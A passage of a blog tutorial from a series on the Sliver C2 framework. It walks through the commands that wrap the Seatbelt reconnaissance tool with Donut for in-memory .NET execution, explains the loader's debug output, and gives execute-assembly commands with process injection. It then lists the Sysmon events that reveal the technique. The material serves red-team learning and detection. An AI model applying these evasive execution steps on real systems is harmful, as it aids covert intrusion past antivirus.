+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Now on to the second step.
+Run <code>.\donut.exe -p &quot;-group=user&quot; C:\playground\ghostpack\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe</code>
+(does not have to be the VS 2022 command prompt, can be any terminal window, I used PowerShell).
+You will see a lot of output and if it works a file called &ldquo;instance&rdquo; is created in the end:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/creating_donut_instance.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Creating a Donut instance for Seatbelt</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>The output is a lot of debug messages.
+You will find quite a few references in there to all the Donut features I told you about before,
+but I promised to ignore that so on to step three.</p>
+<p>The instance that was created can be thought of as the data for the loader.
+Normally, the instance would be a part of the Donut shellcode.
+In this debug setup, you run the loader as &ldquo;loader.exe&rdquo; and pass the instance as an argument:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/running_donut_instance.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Running the Seatbelt Donut instance</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>More debug messages, but this time also a few interesting ones.
+Below you find an excerpt from the terminal window output
+containing the lines I&rsquo;d like to draw your attention to
+(the line numbers were added by me):</p>
+<pre tabindex="0"><code>PS C:\playground\donut&gt; .\loader.exe .\instance
+Running...
+...
+( 1) DEBUG: loader/loader.c:189:MainProc(): Loading mscoree
+...
+( 2) DEBUG: inmem_dotnet.c:43:LoadAssembly(): CLRCreateInstance
+( 3) DEBUG: inmem_dotnet.c:51:LoadAssembly(): ICLRMetaHost::GetRuntime(&#34;v4.0.30319&#34;)
+( 4) DEBUG: inmem_dotnet.c:59:LoadAssembly(): ICLRRuntimeInfo::IsLoadable
+( 5) DEBUG: inmem_dotnet.c:63:LoadAssembly(): ICLRRuntimeInfo::GetInterface
+...
+( 6) DEBUG: inmem_dotnet.c:93:LoadAssembly(): ICorRuntimeHost::Start
+...
+( 7) DEBUG: inmem_dotnet.c:102:LoadAssembly(): ICorRuntimeHost::CreateDomain(&#34;X9YF6MPW&#34;)
+...
+( 8) DEBUG: inmem_dotnet.c:121:LoadAssembly(): Copying 605696 bytes of assembly to safe array
+( 9) DEBUG: inmem_dotnet.c:127:LoadAssembly(): AppDomain::Load_3
+...
+(10) DEBUG: inmem_dotnet.c:169:RunAssembly(): MethodInfo::EntryPoint
+(11) DEBUG: inmem_dotnet.c:174:RunAssembly(): MethodInfo::GetParameters
+...
+(12) DEBUG: inmem_dotnet.c:200:RunAssembly(): Adding &#34;-group=user&#34; as parameter 1
+(13) DEBUG: inmem_dotnet.c:222:RunAssembly(): MethodInfo::Invoke_3()
+
+
+                        %&amp;&amp;@@@&amp;&amp;
+                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%
+                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####
+###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&amp;%%%%%%%################
+                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*
+                        &amp;%%&amp;&amp;&amp;%%%%%        v1.2.1         ,(((&amp;%%%%%%%%%%%%%%%%%,
+                         #%%%%##,
+
+
+...
+</code></pre><p>Given these messages its easy to follow along in the Donut source code (look for <code>DPRINT</code>).
+Relevant parts are in
+<a href="https://github.com/TheWover/donut/blob/2217b8bdf186b31943eeb0f27b96128d3c8038c1/loader/loader.c">loader/loader.c</a>
+and <a href="https://github.com/TheWover/donut/blob/2217b8bdf186b31943eeb0f27b96128d3c8038c1/loader/inmem_dotnet.c">loader/inmem_dotnet.c</a>.</p>
+<p>At the top in line (1) it says it loads a library called &ldquo;mscoree.dll&rdquo;.
+A quick Google search for this library shows that it is also called the &ldquo;Microsoft .NET Runtime Execution Engine&rdquo;.
+Looking at the <a href="https://github.com/TheWover/donut/blob/2217b8bdf186b31943eeb0f27b96128d3c8038c1/loader/loader.c#L189">code</a>
+you find a corresponding call to
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>.
+Given that we want to run a .NET assembly, it seems logical that .NET-related libraries must be loaded.</p>
+<p>Further below are the lines related to the file &ldquo;loader/inmen_dotnet.c&rdquo;,
+which is where the core of the .NET loading code resides.
+Line (2) says that Donut calls <a href="https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clrcreateinstance-function">CLRCreateInstance</a>,
+a function that returns different kinds of interfaces.
+In the <a href="https://github.com/TheWover/donut/blob/2217b8bdf186b31943eeb0f27b96128d3c8038c1/loader/inmem_dotnet.c#L45">code</a>
+you can see that Donut requests an
+<a href="https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrmetahost-interface">ICLRMetaHost</a>
+here.</p>
+<p>In lines (3), (4) and (5) we see how this meta host is used to verify
+if the CLR version &ldquo;v4.0.30319&rdquo; can be loaded and to eventually get an
+<a href="https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface">ICLRRuntimeHost</a>
+for it, which is requested
+<a href="https://github.com/TheWover/donut/blob/2217b8bdf186b31943eeb0f27b96128d3c8038c1/loader/inmem_dotnet.c#L65">here</a>,
+using <a href="https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimeinfo-getinterface-method">GetInterface</a>.</p>
+<p>This runtime host is started in line (6) and then Donut creates an
+application domain with a random name in line (7).
+Compare this to the screenshots from the beginning of this post,
+where we saw in Process Hacker that a .NET application domain
+with a similar name existed in &ldquo;calc.exe&rdquo; and Seatbelt ran inside of it.
+This must be how it was created.</p>
+<p>Skipping over a small technicality, we proceed with line (8),
+where lots of bytes are copied to a &ldquo;safe array&rdquo;.
+<a href="https://github.com/TheWover/donut/blob/2217b8bdf186b31943eeb0f27b96128d3c8038c1/loader/inmem_dotnet.c#L123">Looks like</a>
+Donut copies the assembly into this array.
+This is done because the application domain method &ldquo;Load_3&rdquo;,
+called in line (9), likes to get it this way.
+As a result, the assembly should now have been loaded into the
+application domain.</p>
+<p>Time to run it.
+Given that &ldquo;Seatbelt.exe&rdquo; is an executable, Donut first gets
+the entry point (line (10)) and from that the parameters (line (11)).
+I specified just one parameter, which it apparently found and then
+added in line (12).</p>
+<p>The moment of trust comes in line (13).
+&ldquo;Invoke_3&rdquo; is called (by now we are
+<a href="https://github.com/TheWover/donut/blob/2217b8bdf186b31943eeb0f27b96128d3c8038c1/loader/inmem_dotnet.c#L222">here</a>)
+and after that, we can see the familiar Seatbelt console output.
+This is a good sign and suggests the loader did its job well.</p>
+<p>Note that once Seatbelt is finished the loader also does some cleanup.
+Have a look for yourself if you are interested.</p>
+<p>To summarize, all Donut seems to do is calling a few .NET-related Windows APIs
+to load the CLR, create an application domain, put the assembly inside and run it.
+Of course its a bit more complicated than that.
+The above is just an exemplary run and as usual, the devil is in the details.
+However, this shall suffice here for illustration.</p>
+<h2 id="detection">Detection</h2>
+<p>Let&rsquo;s zoom out again and look at what we did so far.
+We downloaded open-source hacker software from GitHub (Microsoft-owned company)
+and used it to snoop around on a Windows system (Microsoft OS) under the radar
+of Defender (Microsoft AV product).
+How can we put an end to this madness?</p>
+<p>In one of the previous posts I&rsquo;ve set up Sysmon (admittedly also from Microsoft),
+<a href="../../post/learning_sliver_c2_06_stagers_process_injection/">click here</a>
+to see how.
+Its worth to take a look at the events it collects when <code>execute-assembly</code> is used.
+Let&rsquo;s start with the sacrificial process execution style.
+I ran Seatbelt again with the following command (which runs quickly and does not do
+much that could generate additional alerts):</p>
+<pre tabindex="0"><code>execute-assembly --process calc.exe --ppid 5420 /home/kali/files/ghostpack/Seatbelt.exe -group=user
+</code></pre><p>Then I opened up the Windows Event Viewer and looked at the events Sysmon collected.
+Here is a screenshot:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/sysmon_events_during_execute_assembly.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Sysmon events observed when using execute-assembly with a sacrificial process</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Sysmon collected the following events I thought might be interesting:</p>
+<ul>
+<li>Event 10: process access with &ldquo;GrantedAccess&rdquo; &ldquo;0x1fffff&rdquo; from &ldquo;msgedge.exe&rdquo; to &ldquo;calc.exe&rdquo;</li>
+<li>Event 8: create remote threat from &ldquo;msgedge.exe&rdquo; to &ldquo;calc.exe&rdquo;</li>
+<li>Event 7: e.g. image load &ldquo;C:\Windows\System32\mscoree.dll&rdquo; from &ldquo;calc.exe&rdquo;</li>
+</ul>
+<p>First there are the events 10 and 8, both of which are related to the process injection method
+implemented in Sliver. We see how the Edge browser acquired a handle to &ldquo;calc.exe&rdquo;
+and how it created a remote thread in that process.
+Highly suspicious, unless the Sliver operator would do some research before and use a process
+for which this is natural behavior in the target environment.
+If that was impossible, the operator had to break the logging or customize Sliver to implement
+a different process injection technique.</p>
+<p>There was also event 7, related to the loading of &ldquo;mscoree.dll&rdquo; into &ldquo;calc.exe&rdquo;.
+Unless the process chosen by the operator would naturally load that library,
+this event would also be a warning signal.
+It is Donut-related and its implications are, for example, discussed in
+TheWover&rsquo;s <a href="https://thewover.github.io/Introducing-Donut/#detecting-clr-injection">Donut blog post</a>.
+The operator would have to do some research to find a suitable process
+in which the CLR is already loaded to avoid this detection
+(and afaik Sliver does not tell you that).</p>
+<p>This was the sacrificial process execution method.
+Let&rsquo;s try the in-process method next, which I ran with this command:</p>
+<pre tabindex="0"><code>execute-assembly --in-process /home/kali/files/ghostpack/Seatbelt.exe -group=user
+</code></pre><p>As before, here is a screenshot with the events:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/sysmon_events_during_execute_assembly_inprocess.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Sysmon events observed when using execute-assembly with in-process execution</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>This time, the list of Sysmon events I consider interesting is a bit shorter:</p>
+<ul>
+<li>Event 7: e.g. image load &ldquo;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll&rdquo; (Microsoft .NET Runtime Common Language Runtime - WorkStation)</li>
+</ul>
+<p>As expected, there are no events related to process injection since we did not do that.
+The only events I saw this time were related to loading the CLR.
+Since Edge does not load it naturally we see this evidence of Donut again.</p>
+<p>Thus, you could say that in-process execution is a bit less stable but also more stealthy than
+the sacrificial process.
+In any case, Sliver operators not taking sufficient care could be noticed with Sysmon telemetry in any case.</p>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2022-11-06T00:00:00&#43;00:00">
+    6 Nov, 2022
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a> and <a href="/categories/sliver/">sliver</a></span>
+  
+  
+    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/donut/">donut</a>, <a href="/tags/execute-assembly/">execute-assembly</a>, <a href="/tags/implant/">implant</a>, <a href="/tags/sliver/">sliver</a> and <a href="/tags/tutorial/">tutorial</a>
+  
+  using <span itemprop="wordCount">5813</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_08_implant_basics/">Learning Sliver C2 (08) - Implant Basics</a>
+        <time datetime="20M">20 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers_process_injection/">Learning Sliver C2 (07) - Stagers: Process Injection</a>
+        <time datetime="21M">21 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers/">Learning Sliver C2 (06) - Stagers: Basics</a>
+        <time datetime="25M">25 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_05_transports_in_detail_dns/">Learning Sliver C2 (05) - Transports in Detail: DNS</a>
+        <time datetime="9M">9 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_04_transports_in_detail_http_and_https/">Learning Sliver C2 (04) - Transports in Detail: HTTP and HTTPS</a>
+        <time datetime="18M">18 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard</a>
+        <time datetime="11M">11 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_02_beacons_and_sessions/">Learning Sliver C2 (02) - Beacons and Sessions</a>
+        <time datetime="13M">13 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
